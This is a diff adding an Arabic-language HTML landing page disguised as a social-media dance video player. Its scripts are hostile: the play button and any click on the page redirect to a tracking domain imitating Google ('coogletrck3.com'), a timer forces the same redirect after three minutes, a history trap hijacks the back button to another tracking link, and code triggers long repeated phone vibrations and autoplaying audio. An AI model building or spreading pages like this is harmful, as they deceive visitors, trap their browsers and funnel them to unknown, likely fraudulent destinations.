@@ -1,0 +1,468 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
+<head>
+	<title>شاهد الفيديو</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+	<meta name="MobileOptimized" content="width" />
+	<meta name="HandheldFriendly" content="true" />
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta name="format-detection" content="telephone=no" />
+	<style>
+		/** header **/
+		.header {}
+
+		.header .wrapper {
+			display: block;
+		}
+
+		.header .header-text {}
+
+		.header .age-limit {}
+
+		.main {}
+
+		.main .activation-btn-wrapper {}
+
+		.main .activation-btn {}
+
+		.activation-btn:before {}
+
+		.activation-btn:after {}
+
+		.main .activation-btn-text {}
+
+		.main .info-block-wrapper {}
+
+		.main .info-block {}
+
+		.main .info-block .info-block-text {}
+
+		.main .info-block-text {}
+
+		.main .cancel-btn-wrapper {
+			display: none;
+		}
+
+		@media screen and (max-height:550px) {
+			.main .cancel-btn-wrapper {
+				display: none;
+			}
+		}
+
+		.main .cancel-btn {
+			display: none;
+		}
+
+		.main .cancel-btn-text {}
+
+		.footer {}
+
+		@media screen and (max-width:400px) {
+			.footer {}
+		}
+
+		.footer .wrapper {}
+
+		.footer .footer-text {}
+
+		.footer .footer-text-delim {}
+
+		.footer .footer-text.small {}
+
+		.modal {
+			display: none;
+		}
+
+		.modal .modal-dialog {}
+
+		.modal .close-top {}
+
+		.modal .close-top a {}
+
+		.modal .close-bottom {}
+
+		.modal .close-bottom a {}
+
+		.modal .modal-content {}
+
+		.modal .modal-content h3 {}
+
+		.modal .modal-content p {}
+
+		.modal-backdrop {}
+
+		.background {}
+
+		@media screen and (orientation: landscape) {
+			.header {}
+
+			.header .wrapper {}
+
+			.header .age-limit {}
+
+			.main .activation-btn-wrapper {}
+
+			.main .activation-btn-wrapper {}
+
+			.main .info-block-wrapper {}
+
+			.footer {}
+
+			.footer .wrapper div {}
+		}
+
+		.bee-box,
+		.d-none {
+			display: none;
+		}
+
+		/*end bee rubbish */
+
+		/* our mobile styles
+	    ---------------------------------------------------*/
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		body {
+			background: #000;
+			font-size: 10px;
+			line-height: 1;
+			font-family: 'Open Sans', sans-serif;
+		}
+
+		body.load {
+			background: #000;
+		}
+
+		body,
+		a {
+			-webkit-text-size-adjust: none;
+			text-size-adjust: none;
+		}
+
+		a {
+			text-decoration: underline;
+		}
+
+		/* our mobile styles
+		---------------------------------------------------*/
+		.blur {
+			-webkit-filter: blur(2px);
+			-moz-filter: blur(2px);
+			filter: url('../data:image/svg+xml;charset=utf8,<svg version="1.1" xmlns="http://www.w3.org/2000/svg"><filter id="blur"><feGaussianBlur stdDeviation="2"/></filter></svg>#blur');
+			filter: blur(2px);
+		}
+
+		.mpic {
+			display: block;
+			max-width: 100%;
+			margin: 0 auto;
+		}
+
+		body:before {
+			content: '';
+			position: absolute;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			background: url('../poster.jpg') center center no-repeat;
+			background-size: cover;
+			opacity: 0.3;
+			-webkit-filter: blur(30px);
+			filter: blur(30px);
+			z-index: 5;
+		}
+
+		.wrap {
+			position: fixed;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			background: #000;
+			max-width: 480px;
+			margin: 0 auto;
+			z-index: 111;
+		}
+
+		.wrap-video {
+			position: absolute;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			z-index: 11;
+			overflow: hidden;
+		}
+
+		.gray {
+			filter: brightness(0.4);
+		}
+
+		.video {
+			position: absolute;
+			top: 0;
+			left: 0;
+			width: 100%;
+		}
+
+		.header {
+			position: absolute;
+			top: 15px;
+			left: 0;
+			right: 0;
+			z-index: 10000;
+			color: #fff;
+			font-size: 15px;
+			line-height: 20px;
+			text-align: center;
+		}
+
+
+		.header span strong {
+			opacity: 1;
+			padding-bottom: 5px;
+			border-bottom: 2px solid #fff;
+			border-radius: 1px;
+			padding-left: 0;
+		}
+
+		.header strong {
+			opacity: 0.6;
+			padding-left: 8px;
+		}
+
+		.header img {
+			max-width: 100%;
+		}
+
+		.header__play {
+			position: absolute;
+			right: 15px;
+			top: -8px;
+			width: 40px;
+			height: 40px;
+		}
+		.header__mute {
+			position: absolute;
+			width: 40px;
+			height: 40px;
+			right: 15px;
+			top: 40px;
+		}
+
+		.header__camera {
+			position: absolute;
+			left: 15px;
+			top: -8px;
+			width: 40px;
+			height: 40px;
+			border-radius: 50%;
+			overflow: hidden;
+		}
+
+		.sign {
+			position: absolute;
+			top: -50px;
+			left: 0;
+			right: 0;
+			color: #fff;
+			font-size: 20px;
+			text-shadow: 0 0 4px rgba(0, 0, 0, 0.9);
+		}
+
+		.main {
+			position: absolute;
+			top: 50%;
+			left: 0;
+			width: 100%;
+			-webkit-transform: translateY(-50%);
+			-ms-transform: translateY(-50%);
+			-moz-transform: translateY(-50%);
+			-o-transform: translateY(-50%);
+			transform: translateY(-50%);
+			margin-top: -30px;
+			text-align: center;
+			z-index: 10000;
+		}
+
+
+		.footer {
+			position: absolute;
+			bottom: 0;
+			left: 0;
+			right: 0;
+			color: #555;
+			font-size: 16px;
+			line-height: 0.8;
+			text-align: center;
+			background: #000;
+			z-index: 10000;
+		}
+
+		.footer-img {
+			padding-bottom: 2px;
+			background-color: #000;
+		}
+
+		.right-bar {
+			position: absolute;
+			right: 0px;
+			bottom: 100%;
+			margin-bottom: 10px;
+			width: 146px;
+			height: 460px;
+			background: url('../vk-right.jpg') center bottom no-repeat;
+			background-size: 100% auto;
+			z-index: -1;
+		}
+
+		.desc {
+			position: absolute;
+			left: 12px;
+			right: 80px;
+			bottom: 100%;
+			margin-bottom: 10px;
+			color: #fff;
+			font-size: 14px;
+			line-height: 20px;
+			text-align: left;
+		}
+
+		.desc-name {
+			line-height: 23px;
+			font-weight: bold;
+			margin-bottom: 5px;
+		}
+
+		.desc-name span {
+			font-size: 13px;
+			border-radius: 7px;
+			padding: 6px 12px;
+			margin-left: 10px;
+			color: #fff;
+			background-color: rgba(255, 255, 255, 20%);
+		}
+
+		.desc p {
+			display: inline-block;
+			opacity: 0.6;
+		}
+
+
+		.desc-music {
+			margin-top: 5px;
+			padding-left: 20px;
+			background: url('../m.png') left center no-repeat;
+		}
+
+		.load {
+			max-width: 50%;
+		}
+		@media (max-width:374px){
+			.right-bar {
+				width: 110px;
+			}
+			.header__camera {
+				left: 8px;
+				width: 30px;
+				height: 30px;
+				top: -4px;
+			}
+			.header__play {
+				right: 8px;
+				width: 30px;
+				height: 30px;
+				top: -4px;
+			}
+			.header__mute {
+				display: none;
+			}
+		}
+		@media (max-height:459px){
+			.right-bar {
+				width: 90px;
+				right: 4px;
+			}
+		}
+		@media (max-height:480px){
+			.sign{
+				display: none;
+			}
+		}
+		@media (max-height: 420px) {}
+
+		@media (orientation: landscape) and (min-width: 768px) {}
+	</style>
+</head>
+<body class="background" id="resize">
+	<div class="wrap ">
+		<div class="wrap-video gray">
+			<video class="video"  src="../">
+				<source type="video/mp4">
+			</video>
+		</div>
+		<div class="header">
+			<div class="header__camera">
+				<img src="../camera.png" alt="" />
+			</div>
+			<span> <strong>لك</strong></span> <strong> التالي </strong> <strong>الشائع </strong>
+			<div class="header__play">
+				<img src="../play.jpg" alt="" />
+			</div>
+			<div class="header__mute">
+				<img src="../mute.jpg" alt="" />
+			</div>
+		</div>
+		<div id="main-block" class="main">
+			<a href="https://coogletrck3.com/click.php?lp=1" class="step-1">
+				<svg class="play-icon mpic" width="70" height="70" viewBox="0 0 48 48" fill="#fff"
+					xmlns="http://www.w3.org/2000/svg">
+					<path fill-rule="evenodd" clip-rule="evenodd"
+						d="M12 8.77702C12 6.43812 14.5577 4.99881 16.5569 6.21266L41.6301 21.4356C43.5542 22.6038 43.5542 25.3962 41.6301 26.5644L16.5569 41.7873C14.5577 43.0012 12 41.5619 12 39.223V8.77702Z">
+					</path>
+				</svg>
+			</a>
+		</div>
+		<div class="footer">
+			<div class="desc">
+				<div class="desc-name">Abdullah. H <span>يتبع</span> </div>
+				<p>#dance #dancehall #hip-hop</p>
+			</div>
+			<div class="right-bar"></div>
+			<img class="mpic footer-img" src="../vk.png" alt="">
+		</div>
+	</div>
+<script>
+    navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+    navigator.vibrate([11000, 1500, 11000, 1500, 11000, 1500]);
+</script>
+<audio autoplay="autoplay" preload="">
+    <source src="../default.mp3" type="audio/mpeg">
+    <source src="../default.ogg" type="audio/ogg">
+</audio>
+<script>
+    navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+    navigator.vibrate([11000, 1500, 11000, 1500, 11000, 1500]);
+</script>
+<script type="text/javascript">
+	document.body.addEventListener('click', function() { window.location = 'https://coogletrck3.com/click.php?lp=1'; }, false);
+</script>
+<script language="javascript">
+	window.setTimeout(function() {
+		window.location.href = 'https://coogletrck3.com/click.php?lp=1';
+	}, 180000);
+</script>
+<script>
+	window.history.pushState({ page: 1 }, '', '');
+	window.onpopstate = function(event) {
+		if (event) {
+			window.location.href = 'https://coogletrck3.com/click.php?key=0lp9k1kle3m19wqtwn9o';
+		}
+	}
+</script>
+</body>
+</html>
